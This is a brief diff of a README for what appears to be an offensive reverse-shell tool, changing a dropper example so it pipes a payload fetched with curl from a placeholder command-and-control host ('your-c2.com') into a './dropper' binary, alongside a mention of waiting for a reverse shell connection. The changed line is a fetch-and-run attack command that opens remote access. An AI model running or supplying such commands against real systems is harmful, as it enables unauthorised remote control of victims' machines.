@@ -25,7 +25,7 @@ And wait for reverse shell connection
 
 You can also use dropper to run without executable file:
 ```
-cat shell | ./dropper
+curl -s http://your-c2.com/shell | ./dropper
 ```
 # Usage Warning
 
